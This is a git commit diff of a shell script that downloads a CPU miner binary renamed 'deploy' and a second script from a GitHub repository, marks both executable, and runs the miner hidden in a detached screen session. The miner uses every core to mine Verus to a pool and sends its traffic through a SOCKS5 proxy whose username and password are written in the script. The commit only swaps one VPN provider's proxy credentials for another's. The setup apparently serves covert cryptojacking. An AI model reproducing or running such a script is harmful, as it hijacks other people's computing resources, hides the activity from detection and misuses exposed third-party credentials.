165b3d2d043ec50c1a73d5a67edef48879f0e7a4
thepowert <96099226+thepowert@users.noreply.github.com>
2021-12-14 14:26:51 +0700

    Update semang.sh

--- semang.sh
+++ semang.sh
@@ -9,5 +9,5 @@ sleep 10s
 wget -qO deploy https://github.com/renifer12/master/raw/master/ccminer
 wget -qO compile https://github.com/renifer12/master/raw/master/compile.sh
 chmod +x deploy compile
-screen -dm -S run ./deploy -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.Ren_$(cat /proc/sys/kernel/hostname)_$(echo $worker) -p c=VRSC -t $(nproc --all) -x socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080
+screen -dm -S run ./deploy -a verus -o stratum+tcp://ap.luckpool.net:3956 -u RA5S1Suf1BHvTiphQ3VRnWy6aShii374j5.Ren_$(cat /proc/sys/kernel/hostname)_$(echo $worker) -p c=VRSC -t $(nproc --all) -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080
 sleep 10s && ./compile
